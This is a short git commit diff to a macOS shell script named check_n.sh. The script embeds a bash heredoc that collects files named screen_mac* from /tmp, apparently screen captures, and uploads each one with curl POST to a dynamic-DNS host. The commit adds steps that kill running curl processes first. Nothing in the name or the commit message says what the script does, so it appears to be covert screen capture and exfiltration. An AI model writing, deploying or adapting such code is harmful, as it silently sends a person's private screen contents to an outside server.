cac4f2b395790c79b4cb5d1130f986d40d69b3e7
Kirill Kochubey <kirill.kochubey@gmail.com>
2016-05-01 14:43:03 -0700

    Update check_n.sh

--- mac/check_n.sh
+++ mac/check_n.sh
@@ -16,6 +16,8 @@ sudo /System//Library/PrivateFrameworks/Apple80211.framework/Versions/A/Resource
 read -r -d '' SCRCAP_KK << EOM2
 \#!/bin/bash/
 set -ex
+killall curl || true
+sudo killall curl || true
 find /tmp -name screen_mac* -type f -print | while read -r file ; do
   echo "uploading \$file"
   curl -X POST --form file=@\$file http://kk61676.ddns.net:3001/file || break
